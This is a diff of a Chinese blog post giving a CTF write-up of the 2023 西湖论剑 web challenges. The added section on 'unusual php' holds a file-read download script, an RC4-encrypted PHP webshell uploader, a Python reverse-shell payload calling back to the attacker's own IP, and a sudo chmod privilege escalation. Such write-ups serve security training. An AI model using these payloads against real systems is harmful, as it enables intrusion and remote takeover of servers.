@@ -6,15 +6,16 @@
   
   <title>2023西湖论剑WP | 一个blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="2023西湖论剑初赛复盘笔记   Node Magical Loginmain.js中查看路由 main.js123456app.get(&quot;&#x2F;flag1&quot;,(req,res) &#x3D;&gt; &amp;#123;    controller.Flag1Controller(req,res)&amp;#125;)app.get(&quot;&#x2F;flag2&quot;,(req,res) &#x3D;&gt; &amp;">
+  <meta name="description" content="2023西湖论剑初赛复盘笔记参考：blog小窝   Node Magical Loginmain.js中查看路由 main.js123456app.get(&quot;&#x2F;flag1&quot;,(req,res) &#x3D;&gt; &amp;#123;    controller.Flag1Controller(req,res)&amp;#125;)app.get(&quot;&#x2F;flag2&quot;,(req,res">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2023西湖论剑WP">
 <meta property="og:url" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
 <meta property="og:site_name" content="一个blog">
-<meta property="og:description" content="2023西湖论剑初赛复盘笔记   Node Magical Loginmain.js中查看路由 main.js123456app.get(&quot;&#x2F;flag1&quot;,(req,res) &#x3D;&gt; &amp;#123;    controller.Flag1Controller(req,res)&amp;#125;)app.get(&quot;&#x2F;flag2&quot;,(req,res) &#x3D;&gt; &amp;">
+<meta property="og:description" content="2023西湖论剑初赛复盘笔记参考：blog小窝   Node Magical Loginmain.js中查看路由 main.js123456app.get(&quot;&#x2F;flag1&quot;,(req,res) &#x3D;&gt; &amp;#123;    controller.Flag1Controller(req,res)&amp;#125;)app.get(&quot;&#x2F;flag2&quot;,(req,res">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/570183910230247.png">
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/147564710248673.png">
+<meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/check_code.png">
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/282134411230247.png">
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/unusual_php_index.png">
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/98320512236540.png">
@@ -22,8 +23,10 @@
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/unusual_php_zend_so.png">
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/unusual_php_extension.png">
 <meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/unusual_php_zend.png">
+<meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rc4_search.png">
+<meta property="og:image" content="http://tyelixy.github.io/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rc4_key.png">
 <meta property="article:published_time" content="2023-02-06T02:26:19.000Z">
-<meta property="article:modified_time" content="2023-02-06T04:23:07.010Z">
+<meta property="article:modified_time" content="2023-02-07T04:14:20.595Z">
 <meta property="article:author" content="tyelixy">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="西湖论剑">
@@ -113,7 +116,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <blockquote><p>2023西湖论剑初赛复盘笔记</p>
+        <blockquote><p>2023西湖论剑初赛复盘笔记<br>参考：<br><a target="_blank" rel="noopener" href="https://f5.pm/go-147926.html"></a><br><a target="_blank" rel="noopener" href="https://www.ctfiot.com/95359.html"></a><br><a target="_blank" rel="noopener" href="https://my011215.github.io/2023/02/06/CTF/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Web/#more">blog小窝</a></p>
 </blockquote>
 
 <h3 id="Node-Magical-Login"><a href="#Node-Magical-Login" class="headerlink" title="Node Magical Login"></a>Node Magical Login</h3><p>main.js中查看路由</p>
@@ -133,7 +136,9 @@
 <p>toLowerCase()传入参数为字符串，若传入一个非字符串则会报错。<br>通过抓包修改checkcode传入一个数组：</p>
 <img src="/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/147564710248673.png" class="" title="checkcode一共16个数">
 
-<p>checkcode长度不满16则报Invalid Checkcode2，此处要让数组内有16个元素。<br>然后即可获得flag的后半段回显15792024026197902990902}</p>
+<p>checkcode长度不满16则报Invalid Checkcode2，此处要让数组内有16个元素。</p>
+<img src="/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/check_code.png" class="" title="可以用来报错的checkcode">
+<p>然后即可获得flag的后半段回显15792024026197902990902}</p>
 <h3 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h3><img src="/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/282134411230247.png" class="" title="直接上传">
 <p>提示拒绝multipart&#x2F;form-data形式<br>但使用其他形式上传提示上传失败<br>这里使用大小写绕过，抓包改为Multipart&#x2F;form-data即可获得flag</p>
 <h3 id="unusual-php"><a href="#unusual-php" class="headerlink" title="unusual php"></a>unusual php</h3>
@@ -154,10 +159,46 @@
 <img src="/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/unusual_php_extension.png" class="" title="查找extension位置">
 <p>a&#x3D;read&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20190902&#x2F;zend_test.so读取zend_test.so文件</p>
 <img src="/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/unusual_php_zend.png" class="" title="读取zend_test文件">
-<p>然后需要进行逆向(可使用IDA)</p>
-<blockquote>
-<p>后续：<br>上传RC4加密的webshell<br>post请求提交cmd&#x3D;”phpinfo()”发现可以成功返回<br>然后反弹shell</p>
-</blockquote>
+
+<p>然后需要进行逆向<br>使用python脚本下载文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> requests</span><br><span class="line">url =  <span class="string">&#x27;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=read&amp;file=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so&#x27;</span></span><br><span class="line">result = requests.get(url)</span><br><span class="line">raw_data = result.content</span><br><span class="line">s = raw_data[raw_data.find(<span class="string">b&#x27;\x7fELF&#x27;</span>):]</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;zend_test.so&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<p>得到文件zend_test.so<br>使用IDA打开(格式ELF)<br>打开后页面右侧有</p>
+
+<p>推测经过了rc4加密</p>
+<img src="/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rc4_search.png" class="" title="查找rc4">
+<img src="/2023/02/06/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rc4_key.png" class="" title="获得密钥">
+<p>密钥为：abcsdfadfjiweur</p>
+<p>可使用index.php文件验证</p>
+<p>然后上传RC4加密的webshell<br>使用 python 写一句话木马保存为shell.php文件，rc4加密后上传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="comment">#pycharm下载需要改site-packages文件夹下的crypto首字母为大写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    key = <span class="built_in">bytes</span>(key, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;shell.php&#x27;</span>, rc4_encrypt(<span class="string">&quot;&lt;?php eval(phpinfo());?&gt;&quot;</span>, <span class="string">&quot;abcsdfadfjiweur&quot;</span>), <span class="string">&#x27;text/plain&#x27;</span>)&#125; <span class="comment">#phpinfo()改为$_POST[&#x27;cmd&#x27;]</span></span><br><span class="line">    res = requests.post(url=<span class="string">&#x27;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81?a=upload&#x27;</span>,</span><br><span class="line">                        files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+<p>由index界面可知，文件保存路径为&#x2F;upload&#x2F;shell.php</p>
+<ul>
+<li>使用蚁剑连接<ul>
+<li>在根目录下发现flag文件（复现环境权限被修改，可以直接打开，参考其他wp发现需要提取）</li>
+<li>打开虚拟终端</li>
+<li>cd &#x2F;</li>
+<li>cat flag权限不足</li>
+<li>使用ls -al查看所有文件和权限</li>
+<li>使用sudo -l提示tty问题</li>
+<li>使用python开启pty环境（实践失败）</li>
+</ul>
+</li>
+</ul>
+<p>反弹shell</p>
+<ul>
+<li>搭建阿里云服务器  </li>
+<li>安装 NC<br>  <code>yum install nmap-ncat</code></li>
+<li>在服务器安全组增加开启 2333 端口 （与监听端口保持一致即可） </li>
+<li>开启监听<br>  <code>nc -lvp 2333</code></li>
+<li>post请求提交cmd&#x3D;”phpinfo()”发现可以成功返回<br>  <code>提交请求可以使用burpsuite或hackbar</code></li>
+<li>利用 hackbar 插件反弹 shell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd= <span class="title function_ invoke__">system</span>(<span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;自己的外网ip&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>提权</p>
+<ul>
+<li>sudo -l<br>提示可以使用 chmod </li>
+<li>chmod 提权方法<br>  sudo chmod 6777 &#x2F;flag<br>*读取文件<br>  cat &#x2F;flag</li>
+</ul>
 
       
     </div>
